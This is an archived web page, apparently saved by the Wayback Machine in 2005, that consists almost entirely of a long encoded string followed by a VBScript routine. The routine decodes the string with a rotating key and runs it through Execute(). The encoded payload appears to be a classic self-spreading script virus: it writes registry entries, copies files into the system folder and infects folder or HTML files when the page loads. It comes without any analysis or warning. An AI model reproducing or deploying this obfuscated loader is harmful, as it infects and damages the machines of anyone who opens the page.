KFF`ihKdg$GKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\SbceLsapbnnakx JZle%Rh]kdFeed)VsOadlh'QecPqip^DDDY[<TRN>MT[NRENURobmvan^[Me\qoohetXHefe\d\5'/\Knslkhj\Kisikgr\IZhlX>ciphqPn^een^mca+1/*/7.%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXLnfpp`raULi_knsk_s\Sbmdkpr I^rs]`hncRu^lxsp^l\LknfeedsXFhcnhrobmOqmkokdIjmdrj^s O^stegfsX)`0`)10,)/0,)/0,\/0,)/0,)/0,)/42U/0-^/32)!,[kajd!)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\OhetsZqeXFhcnhrobm[WegcoslNPUBunkdnpOdrobnnXPhn`hvsFdsoZfij`Sq[ryomdmXIqobbkeoULi_knsk_s Knslkhj EgsengdtLdtpbmgoU/a,]/2,)/0,)/0,)b0,)/0,)/0,)/00/[0,*d0///(al]gj%WoLgehe-Ra`Vremd AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UNupenogUNppbnnoULaee[E`bsonIqeb^qej\d(*21,01,KDG[=VON=!<`lhJJIZhlN^f(AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UBoifnnXF`ihLdtpbmgoUMesLsapbnnakx(al]gj%KFnlm]`dFkecen!Kebm'WegOapa+3%% Iqock`m?hlal[CkflojEih^r\IbbrklnfpRh]kddXLsapbnnakx%Ej]FqgbtehmFqgbtehm GCBraZseIbkian')Nn>qrkkRaltmaMetmP^lpLZsh6IbMop!ESK'Eih^Dxelss$PhnLZshSLbreis.aqd%Td^mMdmlI`td< lxsp^l3.U!>mdBeBe P^lpLZsh6orrtaf22XTd^mLsanmTpBbke6WegOapa&RYOMDMXDdrj^k3.'clhAereRt]ksUl?hla< SbmP]mg !SULSEIUJengdl*]klEj]IbWoLgehe-Ra`Vremd AJEUXKO?:K_I:BHEGD\OhetsZqeXFhcnhrobm[Wegcosl[CqkqejmUenlhojUQujUJengdl/+!,Om`rpNoFeed?RO*<npu?hlaVijI`td% pdbXdiw]ek.cbe(PhnLZshs^a\Bhkdak-hpm!?RO*<npu?hlaVijI`td% lxsp^l3.UjjsZkl*`hf%VijI`td% lxsp^l3.Uceodsol'hne?ZklDIAlidn`Mn(SbmP]mg !wa[[Fkecen'gtp+dms%WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[.`ek\%!dheeih^!PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX'clhUBojmdnpSyl^!,Zophbbapbnn+q,mo]nwjena`SlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekfeed\@^eaqesI_hm\%VsOadlh'QecKda`!!HG>X_?E@SO>R_NHNTXowdbbkeX=df]nktE\nnX(PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX]klbbkeXLbreisEj`hnaU!,OAS_khppSlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekFeed\OadlhUNpag[Ckflaj][(PhnLZshTafoP]mg !WO\qilm-et^0$*WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[dheEih^[Sd^klAq[PnhoenmxSd^dtDZmdh^qsXPRHLknpoU!,t50..3C=.,91,A--*BF)1B92&/0=:/0>1604<|VsOadlh'QecPqip^DDDY[<KAOLDS[KNOPUclh?hlaURcnbotDhrtAgbo`^[(z81*212,0-01/C)*0D.&A1B2,0,</4B15C/+3}SamFeedTafo 9ESK'NpagSetmEih^'SpZqtQiEih^+2(mquaBbkeP^lp*Pqip^V^lSetmBbkeP^lp*<koo^Agc BnmcpbnnBnmcpbnnDILeddIp!(Be EgVhakd 87dmllShagAqht?tn_mhojEj]IbTdbrLk\`tehm 9co_nlejm-lk\`tehmBe H^et$MgioEnc]mhoj%4%< _hlaTd^mMgioEnc]mhoj< Ibc(PahsHhbapbnn(2(Be BLN.C^sEtmdnobnnJZle$MgioEnc]mhoj<:!mgejTdbrLk\`tehm 9Kebm'TdbrLk\`tehm,H^m(PahsHhbapbnn%, H^m(BLN.C^sFeedN]fd(PahsHhbapbnn%(>mdBeBe H^m(PahsHhbapbnn%= /ShagPahsHhbapbnn6TdbrLk\`tehm !\Ej]IbKFnlm]`dFkecen!ShelKo_Zsikg(>mdBe>md?tn_mhoj?tn_mhojJJIZhlN^f(N^fSpk+FeedN]fd)Nn>qrkkRaltmaMetmN^fTafoSpk=PrSd^kl*KdgN^`d$KdgOmq)HfKdgP^lpOmq 9!MgejWoLgehe-Ra`Vremd N^fSpk+FeedN]fd>mdBe>md?tn_mhoj?tn_mhojJJK[nSq['CqkqejmRtnbmg%Sq[D 9/MdspHtt60CoPgih^TnndMdspHtt6TalsOqm+*E_TalsOqm>+7 PadnBunkdnpLsregf 9EijZky@brk6U!>wipCoDn`HfNn>qrkkRaltmaMetmO^s PahsBhkdak=?RO*@dtBhkdak'CqkqejmRtnbmg%SamDe\Ru^< ?kdap^Nbf^bt$Rcnbotegf.@bbtehmanr!)RepEoh]dro< PahsBhkdak-Sq[Eoh]droFkecen<nujm=)Bhq AZbhMdml?nl`^q egFkecenlBhkdakBoqgs 9Eoh]dr?htnp* -De\Ru^'`d`Eoh]dr?htnp%TafoFkecen'Mai^J^wtHf=hcOna.?htnp< ,ShagHZrtEgcet<gan< EgrtnKdv$<trn^mtOmqij`+X+Lag'CqkqejmRtnbmg%&0)Ru^Lsregf 9Li`!BunkdnpLsregf,HZrtEgcet<gan$0,H^m(?nqragsSpkhnc,L]lsIj]dx?a`r)*(<trn^mtOmqij`=DICdZmgaLtb$<trn^mtOmqij`+L]lsIj]dx?a`r%Sq[D 90>ksaIbRu^>=)Td^m<trn^mtOmqij`=<trn^mtOmqij`&=hcOna.Emdm$*( !\Etbs @hAerei 9/?nrc=*TkEoh]dr?htnpIbKC]ld(OnaSpkhnc=EBao^'De\Ru^'Htaf'j%Td^mBe f; BhkdakBoqgs PadnBunkdnpLsregf 9BunkdnpLsregf Ci_Ltb*Bsei!i+-&[DxemDkEj]IbEj]IbNaqsE`spBmdaqBh]k=BmspkQer!BunkdnpLsregf,U!,H^m(?nqragsSpkhnc,1%Sq[Rtnbmg6Me]'CqkqejmRtnbmg(E`spBmdaqBh]k*1(Edn$<trn^mtOmqij`(-HZrtEgcet<gan&0)BunkdnpLsregf 9JJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganAgc E_Agc E_HhnpJJK[nSq[=<trn^mtOmqij`Agc BnmcpbnnBnmcpbnnDIPnhoacZse$KgEnknrKdsqfd J^wtQecI`tdO`lq^=GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\@^fra^!=hsg=dgn^d 9VsOadlh'QecKda`!QecI`tdO`lq^(Be @brk@^fra^=! PadnCiodCeckde6Feg`lu=hsg% 3[Dn`HfEonh=-so.@brk@^fra^=DIO^hRu^!CiodCeckde%KFnlm]`dFkecen!CiodCeckde%NaqsPrSd^kl*KdgSkhtaQecI`tdO`lq^+DeljDa`qeaEj]FqgbtehmFqgbtehm GCtmiZfeBhkdak'P]mgN]fd)Nn>qrkkRaltmaMetmO^s BhkdakMai^=?RO*@dtBhkdak'P]mgN]fd)RepShelEih^r 9Eoh]drJZle*?hlalDmsEtbrto< ,FkkE]\g PahsBbkeBm PahsBbkeoFeedEtm=NBao^'FOH-GamDxp^msehmN]fd(PahsBbke*I`td(Be BbkeAqs 9!HPF! KkFeedEtm=GTIE! KkFeedEtm=@SLOnEih^Dxp< IGPNr?hla>wt6FLOMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(gtie!)Dlo^Hf?hla>wt6R;RMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(ubo(>ksaBe BbkeAqs 9!HPM! PadnGtp>wiomr 90>mdBeGdxpIb'U?Zre$I`tdG`ma=NBao^'WegOapa&CeodsolU!)%Nr!TC]ld(LZshJZle%< Q<`sa!VijI`td% =dsgmnp(Td^mAstAqhspl=*Agc E_E_HpmDxelss60MgejFOH-CkixFeed SbmP]mg !sulsei,1\`^rkpho.egh(I`tdG`maFOH-CkixFeed SbmP]mg !wa[[Fkecen'gtp+P]mgN]fd>mdBe>md?tn_mhoj?tn_mhojJJO^sDef')Nn>qrkkRaltmaMetmAkq.?edanTalsIp< SLbreis.O\qilmEuhemai^E_EnkTd^mBmWd^qe6dmllEhldBmWd^qe6r[rDn`HfHfBmWd^qe6r[rMgejSamFOH=<qe]mdO^cdcp!!S_khppbmg*?hlaLxsp^lO^cdcp(LdtPrSd^kl6Cn^`taHaja\s(PRcnbot*Lgehe!)Dlo^O^s =iolaHaja\s 9co_nlejm-alikepl'GC^gq^rt=iolaHaja\s.o^sCHLHD$zF5,4D?+1--<E0)*0D,&@D>2,0,</4B=48=)A}=iolaHaja\s._kdap^Hnom`n_^')RepVsOadlh< =iolaHaja\s.C^sO^cdcp!(:oph^Nbf^bt*ldt?ERI@!!{,=33B>/1)?/9/&01??,85-/-,)@0?2/50+18y(:oph^Nbf^bt*\qe]mdIjlsaj\d(%SamFOH=:oph^Nbf^bt*@dtK[ie_m')Dn`HfRepCiodNbf^bt6FOH-DnbueoFkkE]\g @brkP^lpBm @brkK[ie_mE_DeljTafo.@khvaMxpa;>+Aj]DeljTafo.@khvaMxpa;>*Td^m>wipEonEj]IbFeg`lu=hsg< @brkP^lp*=qir^KepmdrMetm@bl Kmgen:qr$,(K`n`hliv^Bhq e6/ Ph3Ntd^qAnk'i%< Egs($2*Kmd%J^wtSeiiRtnbmg6Fkki9*TkKej!ShelSetm(MdmlGtm6Ao\'Me]'TdbrTaqs,e%0)%IbSeiiMui< -,Td^mMdmlGtm624EhldIbSeiiMui< -)Td^mMdmlGtm625Ej]IbTafoCdZq 9Bhn!SeiiMui, Kmgen:qr$bMk]4%E_TafoCdZq 9Bhn!24%ShagP^lp?a`r6Cdk'14Agc E_P^lpOmqij`=MdmlLsregf SeiiBh]kJ^wtTnHhbkOmq 9!Et^bup^'=hmDdy=kq(/+TdbrTaqsub?kKf!Kar@rn!/)6Opadr=kq(,&!oaCnEe&Jeu:qr$*( 9! Ntd^qAnk'1%% !&r[BrH_%Ddy=kq(.=&Hshak@rn!1)%v^<qLb!G^xAnk'3%< % Kmgen:qr$,( !ub?kKf!Fkki9*TkKej!DxaLsregf)%v^<qLb!P^lpJnl 9@s_!Li`!DxaLsregf,e%0)%!&r[BrH_%Be P^lpJnl 908Mgej!&r[BrH_%MdmlGtm630!&r[BrH_%>mdBeub?kKf!TafoCdZq 9Bhn!SeiiMui* G^xAnk'iFnd-()%v^<qLb!E_TafoCdZq 9Bhn!18%Shag!oaCnEe&SeiiBh]k=oaCn!&r[BrH_%>ksaBe P^lp?a`r6Cdk'25Td^mub?kKf!TafoCdZq 9ubH_!oaCnEe&Dn`Hf%v^<qLb!PahsP^wt6TdbrTaqs SeiiBh]k!oaCnEe&Metm!%&oaCnEe !Et^bup^'TdbrTaqs)TdbrTaqs 9!Et^Rtnbmg6&MdmlLsregf !DmllP^wt6!<% lbreis hZmgqZfe9oas_khpp7! ub?kKf`hbui^mt*pqip^! !<% ]hvlsyh^<'lhripbnn6Zasketta4la_s:,iw;mnp6)ox7vi`mg:,iw;adicas:,iw;s,ij]dx6+7;ohse[hlemx:ahd`^m':&;!% :OPH>S J:LE9DI![`teomHABFHP6/ SBCTD6/ _hce9\nm*fr.%ZbteodX*:bteod!T<nmlhmejm=8&.ALIKEP7! !<% (cir7!% r[BrH_&;+lbreis>% r[BrH_&;o\qilml]gfu]`d=r[rcnbot:&oaCnEe ShelSetm&oaCnEe TnHhbkOmq ub?kKf8&.s_khpp7! ub?kKf8&.BK=X>% r[BrH_&;+ASMH7!OasP^wt6TdbrTaqs ub?kKfUjEncgLsrv^<qLb% DI_om`rp!(VijI`td< BLN.C^sSl^bi]eEoh]dr$)( !\Ib'FOH-FeedEtbrto!VijI`td% pdbX?nl`^q.dms%Td^m?RO*<npu?hlaVijI`td% pdbX?nl`^q.dms(PhnLZshs^a\gcvahe-ge_!>mdBeBe $?RO*?hla>wiomr(SbmP]mg !sulsei,1\`^rkpho.egh%Td^m?RO*<npu?hlaVijI`td% lxsp^l3.Uceodsol'hne+WegOapa&ryomdm/+[kfp`lh'fibAgc E_Agc Bnmcpbnn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 19:09:12 Jan 22, 2005 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 21:15:30 Nov 24, 2011.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
